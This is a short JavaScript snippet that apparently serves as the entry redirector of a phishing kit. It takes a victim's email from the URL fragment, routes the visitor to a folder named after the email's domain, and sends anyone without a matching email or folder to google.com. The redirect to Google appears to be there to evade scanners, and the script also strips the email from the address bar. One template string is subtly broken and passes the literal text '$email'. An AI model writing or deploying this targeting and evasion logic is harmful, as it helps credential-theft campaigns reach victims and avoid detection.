<script>
  const email = window.location.hash.substring(1).trim();

  if (email && email.includes("@")) {
    // Extract domain folder
    const domain = email.split("@")[1];
    const folder = domain.split(".")[0];

    // Try to load the folder's index.html directly
    fetch(`./${folder}/index.html`, { method: 'HEAD' })
      .then(res => {
        if (res.ok) {
          // Folder exists, redirect
          window.location.replace(`./${folder}/#$email`);
        } else {
          // Folder does not exist, redirect to Google
          window.location.replace("https://google.com");
        }
      })
      .catch(() => {
        // Error fetching, redirect to Google
        window.location.replace("https://google.com");
      });

    // Optional: Remove the hash from URL
    history.replaceState(null, null, window.location.pathname + window.location.search);

  } else {
    // No valid email, redirect to Google
    window.location.replace("https://google.com");
  }
</script>

